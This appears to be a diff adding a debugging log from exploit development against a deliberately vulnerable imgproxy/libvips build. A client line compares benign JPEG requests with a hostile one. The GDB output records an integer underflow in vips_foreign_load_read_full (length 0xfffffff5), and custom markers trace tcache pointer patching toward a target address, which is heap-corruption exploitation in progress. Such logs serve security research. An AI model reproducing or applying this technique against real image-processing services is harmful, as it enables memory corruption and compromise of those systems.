@@ -1,0 +1,45 @@
+CLIENT target=($pos + 0x10) preload=2 benign[0]=200:'����\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00��\x00C\x00\x06\x04\x05\x06\x05\x04\x06\x06\x05\x06\x07\x07\x06\x08\n\x10\n\n\t\t\n\x14\x0e\x0f\x0c\x10\x17\x14\x18\x18\x17\x14\x16\x16\x1a' benign[1]=200:'����\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00��\x00C\x00\x06\x04\x05\x06\x05\x04\x06\x06\x05\x06\x07\x07\x06\x08\n\x10\n\n\t\t\n\x14\x0e\x0f\x0c\x10\x17\x14\x18\x18\x17\x14\x16\x16\x1a' hostile=RemoteDisconnected:Remote end closed connection without response
+=== GDB OUTPUT ===
+warning: File "/home/mesh-home/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.0.linux-amd64/src/runtime/runtime-gdb.py" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
+To enable execution of this file add
+	add-auto-load-safe-path /home/mesh-home/go/pkg/mod/golang.org/toolchain@v0.0.1-go1.26.0.linux-amd64/src/runtime/runtime-gdb.py
+line to your configuration file "/home/mesh-home/.config/gdb/gdbinit".
+To completely disable this security protection add
+	set auto-load safe-path /
+line to your configuration file "/home/mesh-home/.config/gdb/gdbinit".
+For more information about this security protection see the
+"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
+	info "(gdb)Auto-loading safe path"
+Breakpoint 1 at 0x2da86f0: file vips.c, line 1304.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[New Thread 0x7fffaeb9f6c0 (LWP 3662873)]
+[New Thread 0x7fffae39e6c0 (LWP 3662877)]
+[New Thread 0x7fffadb9d6c0 (LWP 3662941)]
+[New Thread 0x7fffad39c6c0 (LWP 3662942)]
+[New Thread 0x7fffacb9b6c0 (LWP 3662943)]
+[New Thread 0x7fff97fff6c0 (LWP 3662956)]
+[New Thread 0x7fff977fe6c0 (LWP 3662957)]
+[New Thread 0x7fff96ffd6c0 (LWP 3662958)]
+[New Thread 0x7fff967fc6c0 (LWP 3662965)]
+[New Thread 0x7fff957fa6c0 (LWP 3662967)]
+[New Thread 0x7fff95ffb6c0 (LWP 3662966)]
+[New Thread 0x7fff949ff6c0 (LWP 3662968)]
+[New Thread 0x7fff77fff6c0 (LWP 3662969)]
+[New Thread 0x7fff777fe6c0 (LWP 3663059)]
+[New Thread 0x7fff76ffd6c0 (LWP 3663060)]
+[New Thread 0x7fff767fc6c0 (LWP 3663061)]
+[Switching to Thread 0x7fff77fff6c0 (LWP 3662969)]
+
+Thread 14 "imgproxy-vuln" hit Breakpoint 1, vips_foreign_load_read_full (source=0x7fff7005f4c0, buf=buf@entry=0x7fff700580be, len=len@entry=4294967285) at vips.c:1304
+1304	{
+W6_HIT len=0xfffffff5 buf=0x7fff700580be
+W6_WIRE next_after_body=0x7ff88ff27e08 size=0x35
+W6_PATCHED next=0x7ff88ff280b8 encoded_from=0x7fff700580e0
+W6_M1 0x7fff700580d0
+W6_TCACHE entry1=0x7fff700580e0 count1=6
+Catchpoint 2 (signal SIGSEGV)
+W6_M2 0x7fff700580e0
+W6_TARGET_BYTES
+0x7fff700580e0:	0x0000000000000000	0x0000000000000000
+0x7fff700580f0:	0x0000000000000000	0x00000000000021e1
